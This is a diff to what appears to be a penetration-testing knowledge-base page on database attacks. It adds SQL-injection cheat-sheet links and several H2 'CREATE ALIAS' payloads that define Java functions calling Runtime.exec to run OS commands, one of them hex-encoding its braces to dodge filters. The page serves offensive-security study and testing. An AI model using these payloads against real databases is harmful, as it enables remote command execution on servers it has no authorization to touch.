@@ -3,6 +3,11 @@
 - NoSQLMap - <https://github.com/codingo/NoSQLMap>
 - SQLMap - <http://sqlmap.org/>
 
+## Quick References
+
+- <http://pentestmonkey.net/category/cheat-sheet/sql-injection>
+- <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection>
+
 ## SqlServer 
 
 Moved to dedicated section at <https://kbase.ayoma.me/databases-sqlserver/>
@@ -27,10 +32,25 @@ Moved to dedicated section at <https://kbase.ayoma.me/databases-sqlserver/>
 
 ## H2 
 
+- Java code exec:
+    ```sql
+    CREATE ALIAS REVERSE AS 
+    $$ String reverse(String s){ return new StringBuilder(s).reverse().toString();}$$;
+    CALL REVERSE('Test');
+    ```
 - RCE:
     ```sql
     CREATE​ ​ALIAS​ SHELLEXEC ​AS​ $$ ​String​ shellexec(​String​ cmd) throws java.io.IOException { java.util.Scanner s = ​new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelim iter(​"\\A"​); return s.hasNext() ? s.next() : ""; }$$;
     CALL​ SHELLEXEC(​'id'​)
+    ```
+    ```sql
+    CREATE ALIAS EXEC AS  
+    $$ void e(String cmd) throws java.io.IOException {java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);}$$
+    CALL EXEC('whoami');
+    ```
+    ```sql
+    CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException', HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime(); rt.exec(cmd);',HEXTORAW('007d'));
+    CALL EXEC('whoami');
     ```
 
 ## Redis 
@@ -237,6 +257,7 @@ chmod +s /tmp/shell
 
 - Online complier: <https://rextester.com/l/postgresql_online_compiler>
 - Ref:
+  - <https://dotcppfile.wordpress.com/2014/07/12/blind-postgresql-sql-injection-tutorial/>
   - <https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions>
   - <https://pulsesecurity.co.nz/articles/postgres-sqli>
   - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution>
